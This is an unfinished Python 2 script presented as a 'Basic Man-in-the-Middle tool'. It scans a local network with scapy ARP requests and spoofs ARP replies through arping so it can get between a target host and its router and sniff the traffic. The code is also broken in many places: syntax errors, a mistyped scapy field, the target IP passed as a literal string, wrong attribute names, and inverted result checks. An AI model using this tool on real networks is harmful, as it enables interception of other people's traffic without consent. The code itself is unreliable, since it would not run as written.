#!/usr/bin/env python
import logging
import argparse
import sys
import subprocess
from scapy.all import *

logging.getLogger("scapy.runtime").setLevel(logging.ERROR)

class Network:
	ip=""
	gateway=""
	netmask=""
	size=""
	interface=""

	def setIp(self,ip):
		self.ip = socket.:

class Host:
	ip = ""
	mac = ""

def err(mesg,exitCode):
	print "[[97m-[00m] {}".format(mesg)
	sys.exit(exitCode)

def initArgs():
	parser = argparse.ArgumentParser(
		description="Basic Man-in-the-Middle tool"
	)
	parser.add_argument("-l","--list",action="store_true",
						help="List available targets")
	parser.add_argument("-i","--interface",type=str,help="Interface to use")
	parser.add_argument("-r","--router",type=str,help="Target rotuter  IP")
	parser.add_argument("-t","--target",type=str,help="Target host IP")
	parser.add_argument("-p","--port",type=int,help="Port to sniff")
	parser.add_argument("-o","--output",type=str,help="Output file")
	return parser

def poisonArp(interface,spoofIp,targetIp):
	cmd = ["arping",
			"-Uqi",
			interface,
			"-S",
			spoofIp,
			"-w",
			"2000",
			"targetIp",
			"&"]
	subprocess.Popen(cmd);

def getNetworkSize(netmask):
	netmask = netmask.split(".")
	binStr = ""
	for octet in netmask:
		binStr += bin(int(octet))[2:].zfill(8)
	return str(len(binStr.rstrip("0")))


def getNetwork(_interface):
	network = Network()
	network.interface = _interface
	for iface in config.route.routes:
		if iface[3] == network.interface:
			if iface[2] != "0.0.0.0"
				network.gateway = iface[2]
			if iface[0] != 0:
				network.setIp(iface[0])
			if iface[1] != 0:
				network.setMask(iface[1])
	return network

def probeNetwork(_network):
	# Probe network for available devices
	p = Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdsf=_network.ip+"/"+_network.size)
	ans,unans = srp(p,timeout=2)
	return ans

def listDevices(_network):
	# List available devices
	devices = probeNetwork(_network)
	res = -1
	list = "[-] No devices found on network\n"
	if len(devices) > 0:
		list =	"+-------------------+-------------+\n" +\
				"| MAC               | IP          |\n" +\
				"+-------------------+-------------+\n"
		for device in devices:
			list = list + "| {} | {} |\n".format(device[1].hwsrc,device[1].psrc)
			list = list + "+-------------------+-------------+\n"
		res = 1
	return list,res


def main():
	# TODO: Check if progam is run as root
	parser = initArgs();
	if len(sys.argv) < 2:
		parser.print_help()
		sys.exit(1)
	args = parser.parse_args()
	if not args.interface:
		err("No interface specified",1)
	network = getNetwork(args.interface)
	if args.list:
		list,res = listDevices();
		if res == 0:
			print list
			sys.exit(0)
		else:
			err(list,1)
	if not args.router:
		err("No target router specified",1)
		sys.exit(1)
	if not args.target:
		err("No target host specifed",1)
	if not parser.output:
		print "No output file specified. Using `dump`."
		parser.output = "dump"
	if args.router and args.host:
		me = Host();
		me.mac = get_if_hwaddr(args.interface)

if __name__ == '__main__':
	main()
